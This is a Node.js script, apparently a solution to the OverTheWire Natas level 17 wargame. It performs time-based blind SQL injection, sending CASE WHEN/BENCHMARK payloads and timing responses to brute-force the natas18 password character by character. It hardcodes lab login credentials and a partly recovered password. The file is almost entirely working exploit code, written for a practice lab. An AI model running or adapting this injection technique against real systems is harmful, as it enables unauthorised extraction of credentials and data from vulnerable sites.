#!/usr/bin/env node
/* eslint-disable */
fs = require('fs');
http = require('http');

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
chars='07gqdmIxKFvjsl4yhCDPROwp';
not_chars='nufeaiJzNrAkBQLtcSGEoZUVHW369XT5Mb8Y12';
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';
credentials = {
    host: 'natas17.natas.labs.overthewire.org',
    login: 'natas17',
    password: '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
}
let gen = 0;
let n = 0;
let end = 0;

let total = 0;

function rec(password) {
    total += chars.length;
    console.log(gen++)
    for (let i = 0; i < n; i++) {
        doReq(password, chars[i], n)
    }
}

function init(list) {
    console.log(gen++)
    for (let i = 0; i < list.length; i++) {
        doReq(chars, list[i])
    }
}

function doReq(password, char) {
    const id = n++
    console.log('start!', id)
    // might be able to use the WAITFOR DELAY "HH:MM:SS" command
    // there is some good stuff on this on https://www.owasp.org/index.php/Blind_SQL_Injection
    // const postData = 'username=natas15" AND BENCHMARK(50000000,ENCODE("MSG","by 5 seconds") AND password LIKE BINARY "' + password + char + "%"
    // natas18 confirmed for username
    const SQL_injection_username =   ' AND 1=(CASE WHEN username="natas18" THEN ' +
                            'BENCHMARK(50000000,ENCODE("MSG","by 5 seconds")) ' +
                            'ELSE username END)';
    // injection for getting set of characters
    const SQL_injection_get_set =   ' AND 1=(CASE WHEN password LIKE BINARY "%' + password + char + '%" THEN ' +
                            'BENCHMARK(50000000,ENCODE("MSG","by 5 seconds")) ' +
                            'ELSE username END)';
    // injection for using set of to bruteforce
    const SQL_injection =   ' AND 1=(CASE WHEN password LIKE BINARY "' + password + char + '%" THEN ' +
                            'BENCHMARK(50000000,ENCODE("MSG","by 5 seconds")) ' +
                            'ELSE username END)';
    const postData =        'username=natas18"' +
                            SQL_injection +
                            ' AND ""="';

    // const options = {
    //     host: 'natas15.natas.labs.overthewire.org',
    //     path: '/index.php?debug=true',
    //     method: 'POST',
    //     auth: "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
    //     headers: {
    //             'Content-Type': 'application/x-www-form-urlencoded',
    //             'Content-Length': Buffer.byteLength(postData)
    //         }
    // };

    const options = {
        host: credentials.host,
        path: '/index.php?debug=true',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        time: true,
        headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
    };

    const start_time = new Date().getTime();

    const req = http.request(options, (res) => {
    res.setEncoding('utf8');
    res.on('data', () => {
    });
    res.on('end', () => {
        const time = new Date().getTime();
        if((start_time + 3000) < time) {
            password += char;
            console.log('exists', password, char)
            rec(password)
        } else {
            console.log('false', char)
        }
        // console.log('fail', password, char)
        total--;
        console.log('END!', end++, ' id:', id)
    });
    });

    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
        process.exit();
    });

    // write data to request body
    req.write(postData);
    req.end();
}

// doReq("a","");
rec(password)
// init(abc);